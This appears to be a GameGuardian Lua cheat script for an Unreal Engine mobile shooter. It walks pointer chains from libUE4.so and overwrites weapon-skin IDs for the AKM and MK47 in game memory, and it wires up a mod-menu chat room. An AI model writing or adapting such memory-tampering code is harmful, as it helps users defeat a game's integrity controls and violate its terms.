if readD(addr+0x58) == 1050104 then --AKM
setvalue(addr+0x18,4,xing[4])

end
if readD(addr+0x58) == 1050105 then --AKM
setvalue(addr+0x18,4,xing[5])

end
if readD(addr+0x58) == 205008 then --AKMMK47默认枪托 205008Mk47机械瞄具 203016
setvalue(addr+0x18,4,xing[6])

end
if readD(addr+0x58) == 203016 then --AKM
setvalue(addr+0x18,4,xing[7])
gg.alert("开启成功")

break
end
end
end
end,
									
							function()

toMusic('关闭成功')---语音
end),

changan.switch("AKM自改美化",
function()				
if not gg.getRangesList(("libUE4.so")) or #gg.getRangesList(("libUE4.so")) == 0 then
os.exit(print(("so模块不存在 libUE4.so 请检查游戏进程是否正确？")))
end

local cfg_file = gg.EXT_FILES_DIR.."/"..gg.getFile():match("[^/]+$")..'(息白枪械.).lua'
local chunk = loadfile(cfg_file)
local cfg = nil
if chunk ~= nil then
 cfg = chunk()
end
if cfg == nil then
cfg = {1101001213, 1101001213, 1101001213, 1101001213, 1101001213 ,1101001213 , 1101001213, true}
end
xing = gg.prompt({
"破损:",
"修复:",
"完好",
"改进:",--4
"精致:",--5
"钢铁",--6
"独眼",--7
},cfg,{"text","text","text", "text","text","text","text"})
if xing == nil then else
gg.saveVariable(xing, cfg_file)
if xing[1] == true then xsnb1() end
if xing[2] == true then xsnb2() end
if xing[3] == true then xsnb3() end
if xing[4] == true then xsnb4() end
if xing[5] == true then xsnb5() end
if xing[6] == true then xsnb6() end
if xing[7] == true then xsnb7() end


a=0x0
while(a <=0xAB0)
do
a=a+0x10
mk=gg.getRangesList('libUE4.so')[1].start
add = RUI(RUI(RUI(RUI(RUI(mk + 0xC656D90) + 0x558) + a) + 0x30) + 0x38)
adpd = RUI(RUI(RUI(RUI(RUI(RUI(mk + 0xC656D90) + 0x558) + a) + 0x30) + 0x38) +0x8) +0x18
if readD(adpd) == 1000 then
gg.alert("第一部完成")
addListltems(add,4,0,false)
break
add=add
end
end

nmsl=0xDD30
while(nmsl <=0x866E218)
do
nmsl=nmsl+0x18
addr=RUI(add+nmsl)
----------xsnb666
if readD(addr+0x58) == 1010011 then --AKM
setvalue(addr+0x18,4,xing[1])

end
if readD(addr+0x58) == 1010012 then --AKM
setvalue(addr+0x18,4,xing[2])

end
if readD(addr+0x58) == 1010013 then --AKM
setvalue(addr+0x18,4,xing[3])

end
if readD(addr+0x58) == 1010014 then --AKM
setvalue(addr+0x18,4,xing[4])

end
if readD(addr+0x58) == 1010015 then --AKM
setvalue(addr+0x18,4,xing[5])

end
if readD(addr+0x58) == 1010016 then --AKM
setvalue(addr+0x18,4,xing[6])

end
if readD(addr+0x58) == 1010017 then --AKM
setvalue(addr+0x18,4,xing[7])
gg.alert("开启成功")

break
end
end
end
end,
function()
if not gg.getRangesList(("libUE4.so")) or #gg.getRangesList(("libUE4.so")) == 0 then
os.exit(print(("so模块不存在 libUE4.so 请检查游戏进程是否正确？")))
end

local cfg_file = gg.EXT_FILES_DIR.."/"..gg.getFile():match("[^/]+$")..'(息白枪械.).lua'
local chunk = loadfile(cfg_file)
local cfg = nil
if chunk ~= nil then
 cfg = chunk()
end
if cfg == nil then
cfg = {1101001213, 1101001213, 1101001213, 1101001213, 1101001213 ,1101001213 , 1101001213, true}
end
xing = gg.prompt({
"破损:",
"修复:",
"完好",
"改进:",--4
"精致:",--5
"钢铁",--6
"独眼",--7
},cfg,{"text","text","text", "text","text","text","text"})
if xing == nil then else
gg.saveVariable(xing, cfg_file)
if xing[1] == true then xsnb1() end
if xing[2] == true then xsnb2() end
if xing[3] == true then xsnb3() end
if xing[4] == true then xsnb4() end
if xing[5] == true then xsnb5() end
if xing[6] == true then xsnb6() end
if xing[7] == true then xsnb7() end


a=0x0
while(a <=0xAB0)
do
a=a+0x10
mk=gg.getRangesList('libUE4.so')[1].start
add = RUI(RUI(RUI(RUI(RUI(mk + 0xC656D90) + 0x558) + a) + 0x30) + 0x38)
adpd = RUI(RUI(RUI(RUI(RUI(RUI(mk + 0xC656D90) + 0x558) + a) + 0x30) + 0x38) +0x8) +0x18
if readD(adpd) == 1000 then
gg.alert("第一部完成")
addListltems(add,4,0,false)
break
add=add
end
end

nmsl=0xDD30
while(nmsl <=0x866E218)
do
nmsl=nmsl+0x18
addr=RUI(add+nmsl)
----------xsnb666
if readD(addr+0x58) == 1010011 then --AKM
setvalue(addr+0x18,4,xing[1])

end
if readD(addr+0x58) == 1010012 then --AKM
setvalue(addr+0x18,4,xing[2])

end
if readD(addr+0x58) == 1010013 then --AKM
setvalue(addr+0x18,4,xing[3])

end
if readD(addr+0x58) == 1010014 then --AKM
setvalue(addr+0x18,4,xing[4])

end
if readD(addr+0x58) == 1010015 then --AKM
setvalue(addr+0x18,4,xing[5])

end
if readD(addr+0x58) == 1010016 then --AKM
setvalue(addr+0x18,4,xing[6])

end
if readD(addr+0x58) == 1010017 then --AKM
setvalue(addr+0x18,4,xing[7])

gg.alert("开启成功")
break
end
end
end
end,
									
							function()

toMusic('关闭成功')---语音
end),

changan.switch("MK47自改美化",
function()				
if not gg.getRangesList(("libUE4.so")) or #gg.getRangesList(("libUE4.so")) == 0 then
os.exit(print(("so模块不存在 libUE4.so 请检查游戏进程是否正确？")))
end

local cfg_file = gg.EXT_FILES_DIR.."/"..gg.getFile():match("[^/]+$")..'(息白枪械地铁mk47.).lua'
local chunk = loadfile(cfg_file)
local cfg = nil
if chunk ~= nil then
 cfg = chunk()
end
if cfg == nil then
cfg = {1101009001,1101009001,1101009001,1101009001,1101009001,1010090014,1010090013, true}
end
xing = gg.prompt({
"破损:",
"修复:",
"完好",
"改进:",--4
"精致:",--5
"枪托",--6
"瞄具",--7
},cfg,{"text","text","text", "text","text","text","text"})
if xing == nil then else
gg.saveVariable(xing, cfg_file)
if xing[1] == true then xsnb1() end
if xing[2] == true then xsnb2() end
if xing[3] == true then xsnb3() end
if xing[4] == true then xsnb4() end
if xing[5] == true then xsnb5() end
if xing[6] == true then xsnb6() end
if xing[7] == true then xsnb7() end


a=0x0
while(a <=0xAB0)
do
a=a+0x10
mk=gg.getRangesList('libUE4.so')[1].start
add = RUI(RUI(RUI(RUI(RUI(mk + 0xC656D90) + 0x558) + a) + 0x30) + 0x38)
adpd = RUI(RUI(RUI(RUI(RUI(RUI(mk + 0xC656D90) + 0x558) + a) + 0x30) + 0x38) +0x8) +0x18
if readD(adpd) == 1000 then
gg.alert("第一部完成")
addListltems(add,4,0,false)
break
add=add
end
end

nmsl=0xDD30
while(nmsl <=0x866E218)
do
nmsl=nmsl+0x18
addr=RUI(add+nmsl)
----------xsnb666
if readD(addr+0x58) == 1010091 then --AKM
setvalue(addr+0x18,4,xing[1])

end
if readD(addr+0x58) == 1010092 then --AKM
setvalue(addr+0x18,4,xing[2])

end
if readD(addr+0x58) == 1010093 then --AKM
setvalue(addr+0x18,4,xing[3])

end
if readD(addr+0x58) == 1010094 then --AKM
setvalue(addr+0x18,4,xing[4])

end
if readD(addr+0x58) == 1010095 then --AKM
setvalue(addr+0x18,4,xing[5])

end
if readD(addr+0x58) == 205008 then --AKMMK47默认枪托 205008Mk47机械瞄具 203016
setvalue(addr+0x18,4,xing[6])

end
if readD(addr+0x58) == 203016 then --AKM
setvalue(addr+0x18,4,xing[7])

gg.alert("开启成功")
break
end
end
end
end,
function()
if not gg.getRangesList(("libUE4.so")) or #gg.getRangesList(("libUE4.so")) == 0 then
os.exit(print(("so模块不存在 libUE4.so 请检查游戏进程是否正确？")))
end

local cfg_file = gg.EXT_FILES_DIR.."/"..gg.getFile():match("[^/]+$")..'(息白枪械地铁mk47.).lua'
local chunk = loadfile(cfg_file)
local cfg = nil
if chunk ~= nil then
 cfg = chunk()
end
if cfg == nil then
cfg = {1101009001,1101009001,1101009001,1101009001,1101009001,1010090014,1010090013, true}
end
xing = gg.prompt({
"破损:",
"修复:",
"完好",
"改进:",--4
"精致:",--5
"枪托",--6
"瞄具",--7
},cfg,{"text","text","text", "text","text","text","text"})
if xing == nil then else
gg.saveVariable(xing, cfg_file)
if xing[1] == true then xsnb1() end
if xing[2] == true then xsnb2() end
if xing[3] == true then xsnb3() end
if xing[4] == true then xsnb4() end
if xing[5] == true then xsnb5() end
if xing[6] == true then xsnb6() end
if xing[7] == true then xsnb7() end


a=0x0
while(a <=0xAB0)
do
a=a+0x10
mk=gg.getRangesList('libUE4.so')[1].start
add = RUI(RUI(RUI(RUI(RUI(mk + 0xC656D90) + 0x558) + a) + 0x30) + 0x38)
adpd = RUI(RUI(RUI(RUI(RUI(RUI(mk + 0xC656D90) + 0x558) + a) + 0x30) + 0x38) +0x8) +0x18
if readD(adpd) == 1000 then
gg.alert("第一部完成")
addListltems(add,4,0,false)
break
add=add
end
end

nmsl=0xDD30
while(nmsl <=0x866E218)
do
nmsl=nmsl+0x18
addr=RUI(add+nmsl)
----------xsnb666
if readD(addr+0x58) == 1010091 then --AKM
setvalue(addr+0x18,4,xing[1])

end
if readD(addr+0x58) == 1010092 then --AKM
setvalue(addr+0x18,4,xing[2])

end
if readD(addr+0x58) == 1010093 then --AKM
setvalue(addr+0x18,4,xing[3])

end
if readD(addr+0x58) == 1010094 then --AKM
setvalue(addr+0x18,4,xing[4])

end
if readD(addr+0x58) == 1010095 then --AKM
setvalue(addr+0x18,4,xing[5])

end
if readD(addr+0x58) == 205008 then --AKMMK47默认枪托 205008Mk47机械瞄具 203016
setvalue(addr+0x18,4,xing[6])

end
if readD(addr+0x58) == 203016 then --AKM
setvalue(addr+0x18,4,xing[7])

gg.alert("开启成功")
break
end
end
end
end,
									
							function()

toMusic('关闭成功')---语音
end),

		}, {
--第四页不能改
	}, {
			web6---视频 勿动
		}, {
			wyylog---音乐 勿动

		}
	})











chattable = {
	{
		ltname = "息白内部系统",
		lticon = "https://cccimg.com/down.php/7614d50dd7d848b8f9c5edb0953799d8.jpg",
		lttext = "这个是聊天室你们可以用来聊天，可以用的",
		lttime = "12-7 6:30"
	},
}
tmp = {
	changan.edit("输入聊天内容"),
	changan.button("发送聊天",function() 发送聊天(changan.getedit("输入聊天内容")) end),
	changan.box({
		"   聊天设置",
		changan.edit("用户名"),
		changan.button("修改昵称",function() 修改名字(changan.getedit("用户名")) end),
		changan.text(""),
		changan.edit("请输入链接或QQ"),
		changan.button("修改头像",function() 修改头像(changan.getedit("请输入链接或QQ")) end),
	}),
}
chatlayout = {}
for i = 1,#chattable do
chatlayout[#chatlayout+1] = changan.chat(chattable[i])
end
local function invoke2()
for i = 1,#chatlayout do
_ENV["layoutm4"]:addView(chatlayout[i])
end
for i = 1,#tmp do
_ENV["layoutg4"]:addView(tmp[i])
end
end
local runnable = luajava.getRunnable(invoke2)
local handler = luajava.getHandler()
handler:post(runnable)

gg.sleep(2000)
function proo()
changan.controlRotation2(control1,1000)
end
colors={
0xff00FF9B,---绿色
0xffFF6F59,
0xff7A4FFF,
0xff00FDFF,
0xff0082FF,
---0xffffffff,
}
luajava.newThread(function()--更新逻辑
	while true do
		gg.sleep(1000)---速度
		if already and 当前ui==4 then
		   shuaxinchat()
		end end
end):start()
luajava.newThread(function()--更新逻辑
	while true do
		gg.sleep(60)---速度
		if 显示==1 then
			titlet:setTextColor(colors[math.random(1,#colors)])

		titlet:scrollBy(11,0)----速度
				if titlet:getScrollX()>=600 then titlet:scrollBy(-titlet:getScrollX()-600,0) end
		end
	end
end):start()
--jm1 : setBackground(slcta )
gg.setVisible(false )
luajava.setFloatingWindowHide(true )
---bloc不要动 动了脚本功能会失效
bloc = luajava.getBlock()
bloc("join" )